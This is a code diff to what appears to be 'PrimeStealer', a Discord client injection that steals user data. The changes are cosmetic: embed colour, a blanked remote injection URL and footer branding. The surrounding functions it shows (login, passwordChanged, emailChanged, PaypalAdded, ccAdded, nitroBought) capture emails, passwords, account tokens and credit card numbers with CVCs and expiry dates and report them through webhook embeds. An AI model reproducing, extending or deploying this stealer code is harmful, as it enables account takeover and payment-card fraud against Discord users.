@@ -13,10 +13,10 @@ const config = {
   ping_val: '@everyone',
   embed_name: 'PrimeStealer Injection',
   embed_icon: 'https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg'.replace(/ /g, '%20'),
-  embed_color: 000000,
-  injection_url: 'https://raw.githubusercontent.com/PrimeInj/Injection/main/index.js',
+  embed_color: 8363488,
+  injection_url: '',
   /**
-   
+
    **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'PrimeStealer | t.me/PrimeStealer',
+          text: 'Prime Stealer | t.me/PrimeStealer',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'PrimeStealer | t.me/PrimeStealer',
+          text: 'Prime Stealer | t.me/PrimeStealer',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'PrimeStealer | t.me/PrimeStealer',
+          text: 'Prime Stealer | t.me/PrimeStealer',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'PrimeStealer | t.me/PrimeStealer',
+          text: 'Prime Stealer | t.me/PrimeStealer',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'PrimeStealer | t.me/PrimeStealer',
+          text: 'Prime Stealer | t.me/PrimeStealer',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'PrimeStealer | t.me/PrimeStealer',
+          text: 'Prime Stealer | t.me/PrimeStealer',
         },
       },
     ],
